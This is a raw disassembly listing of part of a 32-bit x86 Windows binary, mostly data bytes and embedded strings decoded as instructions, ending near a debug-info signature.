  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
  42a9b3:	xor    eax,0x4c344f00
  42a9b8:	xor    esi,DWORD PTR [edi]
  42a9ba:	xor    BYTE PTR [edi+0x44],bl
  42a9bd:	inc    edi
  42a9be:	dec    ebx
  42a9bf:	xor    al,BYTE PTR [ecx+0x43]
  42a9c2:	add    BYTE PTR [edi+0x32],cl
  42a9c5:	xor    ebx,DWORD PTR [edi+0x57]
  42a9c8:	xor    cl,BYTE PTR [edi+0x5f]
  42a9cb:	pop    edx
  42a9cc:	add    BYTE PTR [eax+0x4c],bl
  42a9cf:	cmp    DWORD PTR [edi+0x4b],ebx
  42a9d2:	inc    ecx
  42a9d3:	dec    edx
  42a9d4:	inc    esi
  42a9d5:	xor    DWORD PTR [edi+ebx*2],esi
  42a9d8:	pop    eax
  42a9d9:	inc    edi
  42a9da:	inc    edx
  42a9db:	add    BYTE PTR [eax+0x33],dl
  42a9de:	dec    esi
  42a9df:	pop    edi
  42a9e0:	dec    eax
  42a9e1:	xor    eax,0x485f53
  42a9e6:	dec    ebp
  42a9e7:	xor    BYTE PTR [edx+0x5f],al
  42a9ea:	dec    edx
  42a9eb:	pop    eax
  42a9ec:	push   esp
  42a9ed:	dec    ecx
  42a9ee:	dec    esp
  42a9ef:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  42a9f3:	xor    esi,DWORD PTR [eax]
  42a9f5:	pop    edi
  42a9f6:	inc    ecx
  42a9f7:	pop    edx
  42a9f8:	push   ecx
  42a9f9:	pop    edx
  42a9fa:	cmp    DWORD PTR [esi],esi
  42a9fc:	pop    edi
  42a9fd:	dec    eax
  42a9fe:	dec    esp
  42a9ff:	pop    edx
  42aa00:	add    BYTE PTR [ecx+0x57],dl
  42aa03:	pop    ecx
  42aa04:	pop    edi
  42aa05:	push   esi
  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	popw   ss
  42ab5a:	(bad)  
  42ab5b:	fiadd  DWORD PTR [edi-0x7fb9d436]
  42ab61:	add    al,0x31
  42ab63:	lds    ebp,FWORD PTR [edi+0x79]
  42ab66:	stc    
  42ab67:	icebp  
  42ab68:	sbb    al,0x0
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
